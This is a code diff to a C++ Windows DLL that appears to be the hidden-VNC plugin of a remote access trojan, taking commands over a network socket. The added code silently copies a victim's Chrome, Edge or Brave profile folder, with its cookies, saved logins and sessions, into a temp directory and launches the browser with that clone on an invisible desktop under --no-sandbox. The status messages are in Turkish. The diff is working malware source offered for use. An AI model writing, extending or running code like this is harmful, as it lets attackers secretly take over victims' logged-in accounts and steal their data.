@@ -5,6 +5,9 @@
 #include <uxtheme.h>
 #include <dwmapi.h>
 #include <propidl.h>
+#include <shlobj.h>
+#include <shlwapi.h>
+#include <shellapi.h>
 #include <gdiplus.h>
 #include <objidl.h>
 #include <algorithm>
@@ -30,6 +33,8 @@
 #pragma comment(lib, "comctl32.lib")
 #pragma comment(lib, "uxtheme.lib")
 #pragma comment(lib, "dwmapi.lib")
+#pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "shlwapi.lib")
 
 using json = nlohmann::json;
 using namespace Gdiplus;
@@ -1134,6 +1139,77 @@ static wstring utf8_to_wstring(const string& str) {
     return res;
 }
 
+static string wstring_to_utf8(const wstring& wstr) {
+    if (wstr.empty()) return string();
+    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
+    if (size <= 0) return string();
+    string res(size, 0);
+    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &res[0], size, NULL, NULL);
+    if (!res.empty() && res.back() == '\0') res.pop_back();
+    return res;
+}
+
+static wstring GetEnvVar(const wstring& name) {
+    wchar_t buf[MAX_PATH];
+    DWORD res = GetEnvironmentVariableW(name.c_str(), buf, MAX_PATH);
+    if (res > 0 && res < MAX_PATH) return wstring(buf);
+    return L"";
+}
+
+static bool CopyDirectory(const wstring& src, const wstring& dst) {
+    // SHFileOperation expects double-null terminated strings
+    vector<wchar_t> from(src.begin(), src.end());
+    from.push_back(L'\0');
+    from.push_back(L'\0');
+
+    vector<wchar_t> to(dst.begin(), dst.end());
+    to.push_back(L'\0');
+    to.push_back(L'\0');
+
+    SHFILEOPSTRUCTW fileOp = {0};
+    fileOp.wFunc = FO_COPY;
+    fileOp.pFrom = from.data();
+    fileOp.pTo = to.data();
+    fileOp.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_SILENT | FOF_NOERRORUI;
+
+    return SHFileOperationW(&fileOp) == 0;
+}
+
+struct BrowserPaths {
+    wstring exe;
+    wstring userData;
+    wstring name;
+};
+
+static bool GetBrowserInfo(const string& filename, BrowserPaths& info) {
+    wstring localApp = GetEnvVar(L"LOCALAPPDATA");
+    if (localApp.empty()) return false;
+
+    if (filename == "chrome.exe") {
+        info.name = L"Chrome";
+        info.exe = L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
+        if (!PathFileExistsW(info.exe.c_str()))
+             info.exe = L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";
+        info.userData = localApp + L"\\Google\\Chrome\\User Data";
+        return true;
+    } else if (filename == "msedge.exe") {
+        info.name = L"Edge";
+        info.exe = L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe";
+        if (!PathFileExistsW(info.exe.c_str()))
+            info.exe = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
+        info.userData = localApp + L"\\Microsoft\\Edge\\User Data";
+        return true;
+    } else if (filename == "brave.exe") {
+        info.name = L"Brave";
+        info.exe = L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
+        if (!PathFileExistsW(info.exe.c_str()))
+            info.exe = L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
+        info.userData = localApp + L"\\BraveSoftware\\Brave-Browser\\User Data";
+        return true;
+    }
+    return false;
+}
+
 extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
     initialize_visual_styles();
     g_socket = sock;
@@ -1198,26 +1274,55 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             ensure_desktop();
             if (!g_hHiddenDesktop) return;
 
-            wstring path = utf8_to_wstring(cmd.value("path", "cmd.exe"));
-            vector<wchar_t> cmdLine(path.begin(), path.end());
-            cmdLine.push_back(L'\0');
+            thread([cmd]() {
+                if (!SetThreadDesktop(g_hHiddenDesktop)) return;
 
-            wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
-            STARTUPINFOW si = { sizeof(si) };
-            si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
-            si.dwFlags      = STARTF_USESHOWWINDOW;
-            si.wShowWindow  = SW_SHOW;
+                string requestedPath = cmd.value("path", "cmd.exe");
+                wstring path = utf8_to_wstring(requestedPath);
+                BrowserPaths bInfo;
+                bool isBrowser = GetBrowserInfo(requestedPath, bInfo);
+                wstring cmdLineStr;
 
-            PROCESS_INFORMATION pi = { 0 };
-            if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
-                               CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
-                CloseHandle(pi.hProcess);
-                CloseHandle(pi.hThread);
-                g_forceFullFrame = true;
-                send_status("Process started on hidden desktop");
-            } else {
-                send_error("Failed to start process. Error: " + to_string(GetLastError()));
-            }
+                if (isBrowser) {
+                    send_status("Profiller kopyalanıyor...");
+                    wstring tempBase = GetEnvVar(L"TEMP");
+                    if (tempBase.empty()) tempBase = L"C:\\Windows\\Temp";
+
+                    wstring clonePath = tempBase + L"\\hvncp_" + bInfo.name + L"_" + to_wstring(GetTickCount());
+
+                    if (CopyDirectory(bInfo.userData, clonePath)) {
+                        send_status("'" + wstring_to_utf8(bInfo.name) + "' tarayıcı açılıyor...");
+                        // SHFileOperation copies "User Data" folder INTO clonePath, so we point to it
+                        wstring actualProfilePath = clonePath + L"\\User Data";
+                        cmdLineStr = L"\"" + bInfo.exe + L"\" --user-data-dir=\"" + actualProfilePath + L"\" --no-sandbox --disable-gpu";
+                    } else {
+                        send_status("Profil kopyalanamadı, varsayılan ile açılıyor...");
+                        cmdLineStr = L"\"" + bInfo.exe + L"\" --no-sandbox --disable-gpu";
+                    }
+                } else {
+                    cmdLineStr = path;
+                }
+
+                vector<wchar_t> cmdLine(cmdLineStr.begin(), cmdLineStr.end());
+                cmdLine.push_back(L'\0');
+
+                wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
+                STARTUPINFOW si = { sizeof(si) };
+                si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
+                si.dwFlags      = STARTF_USESHOWWINDOW;
+                si.wShowWindow  = SW_SHOW;
+
+                PROCESS_INFORMATION pi = { 0 };
+                if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
+                                   CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+                    CloseHandle(pi.hProcess);
+                    CloseHandle(pi.hThread);
+                    g_forceFullFrame = true;
+                    send_status("Process started on hidden desktop");
+                } else {
+                    send_error("Failed to start process. Error: " + to_string(GetLastError()));
+                }
+            }).detach();
         } else if (action.find("hvnc_mouse") != string::npos ||
                    action.find("hvnc_key")   != string::npos ||
                    action == "hvnc_char" ||
